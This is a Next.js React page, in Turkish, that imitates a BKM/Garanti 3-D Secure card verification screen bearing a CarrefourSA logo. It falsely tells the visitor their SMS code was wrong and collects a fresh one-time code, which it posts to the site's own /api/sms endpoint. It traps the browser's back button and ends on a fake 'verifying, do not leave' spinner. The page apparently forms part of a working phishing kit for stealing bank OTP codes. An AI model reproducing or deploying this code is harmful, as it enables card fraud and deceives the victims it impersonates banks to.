'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
}

export default function HataliSmsPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [smsCode, setSmsCode] = useState('');
    const [error, setError] = useState('');
    const [timeLeft, setTimeLeft] = useState(540);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [isTimeout, setIsTimeout] = useState(false);
    const [referansNo] = useState(() => Math.random().toString(36).substring(2, 10).toUpperCase());
    const inputRef = useRef<HTMLInputElement>(null);

    // Geri gidilmesin
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };
        fetchData();
    }, [router]);

    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            return;
        }
        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);
        return () => clearInterval(timer);
    }, [timeLeft]);

    useEffect(() => {
        if (!loading && inputRef.current) {
            inputRef.current.focus();
        }
    }, [loading]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');
        if (smsCode.length < 5) {
            setError('Şifrenizi giriniz');
            setSmsCode('');
            return;
        }
        setIsSubmitting(true);
        try {
            const response = await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode })
            });
            const result = await response.json();
            if (result.success) {
                setIsSuccess(true);
            } else {
                setError(result.error || 'Bir hata oluştu');
            }
        } catch (err) {
            setError('Bağlantı hatası');
        } finally {
            setIsSubmitting(false);
        }
    };

    const handleRetry = () => {
        setTimeLeft(540);
        setIsTimeout(false);
        setSmsCode('');
        setError('');
    };

    const handleCancel = () => {
        router.push('/');
    };

    if (loading) {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="content-wrapper">
                    <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
                        <div className="loader"></div>
                    </div>
                </div>
            </>
        );
    }

    if (isSuccess) {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    @keyframes spin { to { transform: rotate(360deg); } }
                `}</style>
                <div className="content-wrapper">
                    <div className="header" style={{ marginTop: '1px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 10px' }}>
                        <div className="brand-logo" style={{ margin: 0 }}>
                            <Image 
                                src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'}
                                alt="Card" width={80} height={50} style={{ objectFit: 'contain' }}
                            />
                        </div>
                        <div>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                        </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <div style={{ marginTop: '60px', textAlign: 'center', padding: '0 20px' }} className="action-wrapper">
                                <div style={{ width: '80px', height: '80px', margin: '0 auto 24px', position: 'relative' }}>
                                    <div style={{ width: '100%', height: '100%', border: '4px solid #e5e7eb', borderTopColor: '#3b82f6', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                                </div>
                                <h1 className="small" style={{ fontSize: '20px', fontWeight: '600', color: '#1f2937', marginBottom: '12px' }}>İşleminiz Doğrulanıyor</h1>
                                <p style={{ fontSize: '14px', color: '#6b7280', lineHeight: '1.6', marginBottom: '20px' }}>Bankanız tarafından gönderilen doğrulama kodu kontrol ediliyor.<br />Lütfen bu sayfadan ayrılmayınız.</p>
                                <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: '8px', padding: '12px 16px', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#d97706" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                                    <span style={{ fontSize: '13px', color: '#92400e' }}>Bu işlem birkaç saniye sürebilir</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    }

    return (
        <>
            <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
            <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
            `}</style>

            <div className="content-wrapper">
                <div className="header" style={{ marginTop: '25px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 10px' }}>
                    <div className="brand-logo" style={{ margin: 0 }}>
                        <Image 
                            src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'}
                            alt="Card" width={80} height={50} style={{ objectFit: 'contain' }}
                        />
                    </div>
                    <div>
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                    </div>
                </div>

                <div id="approve-page">
                    {isSubmitting && (
                        <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
                            <div className="loader"></div>
                        </div>
                    )}

                    <div className="content">
                        {/* Hatalı SMS Uyarısı */}
                        <div style={{ background: '#fef2f2', border: '1px solid #fecaca', borderRadius: '8px', padding: '12px 16px', margin: '0 15px 15px 15px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                            <span style={{ fontSize: '14px', color: '#dc2626', fontWeight: '500' }}>Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.</span>
                        </div>

                        <div className="info-wrapper">
                            <div className="info-row">
                                <div className="info-col info-label">İşyeri Adı:</div>
                                <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">İşlem Tutarı:</div>
                                <div className="info-col amount" id="amount">{data?.tutar}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">İşlem Tarihi-Saati:</div>
                                <div className="info-col" id="operation-date-time">{data?.tarih || ''}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">Kart Numarası:</div>
                                <div className="info-col" id="pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                            </div>
                        </div>

                        <div className="action-wrapper">
                            <div>
                                <h3>Şifreniz <span id="msisdn">{data?.maskedPhone}</span> nolu cep telefonunuza gönderilecektir.<br />Referans no: {referansNo}</h3>
                            </div>

                            <div className="form-wrapper">
                                <form id="bkmform" className="form-code" onSubmit={handleSubmit} autoComplete="off">
                                    <div className="form-row">
                                        <label htmlFor="code" className="otpcode">Doğrulama Kodu</label>
                                        <input
                                            ref={inputRef}
                                            type="tel"
                                            className={`f-input ${error ? 'error' : ''}`}
                                            name="otpCode"
                                            id="passwordfield"
                                            minLength={5}
                                            maxLength={6}
                                            value={smsCode}
                                            onChange={(e) => {
                                                const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                setSmsCode(val);
                                                setError('');
                                            }}
                                            placeholder={error || ''}
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            autoComplete="one-time-code"
                                            disabled={isTimeout}
                                        />
                                    </div>

                                    {error && (
                                        <div id="wrongPassDiv" className="error-messages error-wrong-otp" style={{ display: 'block' }}>
                                            <span className="has-reg">Geçersiz bilgi, lütfen tekrar deneyiniz.</span>
                                        </div>
                                    )}

                                    {isTimeout ? (
                                        <div id="timeOutDiv" className="error-messages error-timeover" style={{ display: 'block' }}>
                                            <div><span className="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span></div>
                                            <button type="button" onClick={handleRetry} className="button btn-1 re-code v1">Doğrulama Kodunu Yeniden Gönder</button>
                                        </div>
                                    ) : (
                                        <div id="submitButtonDiv" style={{ display: 'block' }}>
                                            <div className="has-submit">
                                                <button id="submitbutton" type="submit" className="button btn-1 btn-commit" disabled={isSubmitting}>Onayla</button>
                                            </div>
                                            <div id="timerDiv" className="has-timer">
                                                <span>Kalan Süre: </span>
                                                <span className="has-counter" id="has-counter">{formatTime(timeLeft)}</span>
                                            </div>
                                        </div>
                                    )}

                                    <div className="call-to-action">
                                        <ul className="action-list">
                                            <li>
                                                <button type="button" onClick={handleCancel} className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }}>İşlemi İptal Et</button>
                                            </li>
                                        </ul>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
